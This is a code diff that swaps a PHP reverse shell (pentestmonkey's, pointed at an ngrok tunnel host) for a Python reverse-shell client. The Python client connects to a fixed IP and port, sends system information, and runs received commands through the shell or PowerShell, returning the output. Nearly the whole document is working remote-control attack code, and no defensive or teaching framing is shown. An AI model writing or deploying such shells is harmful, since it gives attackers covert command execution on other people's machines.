@@ -1,116 +1,74 @@
-<?php
-// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+import subprocess
+import socket
+import time
+import os
+import sys
+import platform
 
-set_time_limit (0);
-$VERSION = "1.0";
-$ip = '6.tcp.eu.ngrok.io';
-$port = 18184;
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = 'uname -a; w; id; sh -i';
-$daemon = 0;
-$debug = 0;
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-if (function_exists('pcntl_fork')) {
-	$pid = pcntl_fork();
-	
-	if ($pid == -1) {
-		printit("ERROR: Can't fork");
-		exit(1);
-	}
-	
-	if ($pid) {
-		exit(0);  // Parent exits
-	}
-	if (posix_setsid() == -1) {
-		printit("Error: Can't setsid()");
-		exit(1);
-	}
+server_ip = '192.168.1.70'
+server_port = 8080
 
-	$daemon = 1;
-} else {
-	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
-}
+server_address = (server_ip, server_port)
 
-chdir("/");
+client_socket.connect(server_address)
 
-umask(0);
+identifier = '<END_OF_COMMAND_OUTPUT>'
 
-// Open reverse connection
-$sock = fsockopen($ip, $port, $errno, $errstr, 30);
-if (!$sock) {
-	printit("$errstr ($errno)");
-	exit(1);
-}
+system_os = platform.system()
+system_hostname = platform.node()
 
-$descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
-);
+system_info = f'\nOS: {platform.system()}\nHostname: {platform.node()}\nVersion: {platform.version()}\nRelease: {platform.release()}\nArchitecture: {platform.machine()}\nProcessor: {platform.processor()}\n'
 
-$process = proc_open($shell, $descriptorspec, $pipes);
+try:
 
-if (!is_resource($process)) {
-	printit("ERROR: Can't spawn shell");
-	exit(1);
-}
+    sys_info = client_socket.send(system_info.encode())
 
-stream_set_blocking($pipes[0], 0);
-stream_set_blocking($pipes[1], 0);
-stream_set_blocking($pipes[2], 0);
-stream_set_blocking($sock, 0);
+    while True:
+        data = client_socket.recv(1024)
+        server_command = data.decode()
 
-printit("Successfully opened reverse shell to $ip:$port");
+        if server_command.upper() == 'WQ':
+            break
+        elif server_command == '':
+            continue
+        elif server_command.startswith('cd'): 
+            path = server_command.strip('cd ')
+            if os.path.exists(path):
+                os.chdir(path)
+            else:
+                print("Path doesn't exist.")
+            continue
+        else: 
+            # IF MACHINE RUNS WINDOWS 
+            if system_os.upper() == 'WINDOWS':
+                server_command_output = subprocess.run(['powershell.exe', server_command], shell=True, capture_output=True)
 
-while (1) {
-	if (feof($sock)) {
-		printit("ERROR: Shell connection terminated");
-		break;
-	}
+                if server_command_output.stderr.decode('utf-8') == '':
+                    command_result = server_command_output.stdout
+                    command_result = command_result.decode('utf-8') + identifier
+                    command_result = command_result.encode('utf-8')
+                
+                else:
+                    command_result = server_command_output.stderr
+                client_socket.sendall(command_result)
+            # IF MACHINE RUNS LINUX OR MACOS
+            elif system_os.upper() == 'LINUX' or system_os.upper() == 'MACOS':
+                server_command_output = subprocess.run(server_command, shell=True, capture_output=True)
 
-	if (feof($pipes[1])) {
-		printit("ERROR: Shell process terminated");
-		break;
-	}
+                if server_command_output.stderr.decode('utf-8') == '':
+                    command_result = server_command_output.stdout
+                    command_result = command_result.decode('utf-8') + identifier
+                    command_result = command_result.encode('utf-8')
+                
+                else:
+                    command_result = server_command_output.stderr
+                client_socket.sendall(command_result)
 
-	$read_a = array($sock, $pipes[1], $pipes[2]);
-	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
 
-	if (in_array($sock, $read_a)) {
-		if ($debug) printit("SOCK READ");
-		$input = fread($sock, $chunk_size);
-		if ($debug) printit("SOCK: $input");
-		fwrite($pipes[0], $input);
-	}
-
-	if (in_array($pipes[1], $read_a)) {
-		if ($debug) printit("STDOUT READ");
-		$input = fread($pipes[1], $chunk_size);
-		if ($debug) printit("STDOUT: $input");
-		fwrite($sock, $input);
-	}
-
-	if (in_array($pipes[2], $read_a)) {
-		if ($debug) printit("STDERR READ");
-		$input = fread($pipes[2], $chunk_size);
-		if ($debug) printit("STDERR: $input");
-		fwrite($sock, $input);
-	}
-}
-
-fclose($sock);
-fclose($pipes[0]);
-fclose($pipes[1]);
-fclose($pipes[2]);
-proc_close($process);
-
-function printit ($string) {
-	if (!$daemon) {
-		print "$string\n";
-	}
-}
-
-?>
+except KeyboardInterrupt:
+    sys.exit()
+except Exception as e:
+    print(f'Error occured.\n {e}')
+    time.sleep(5)
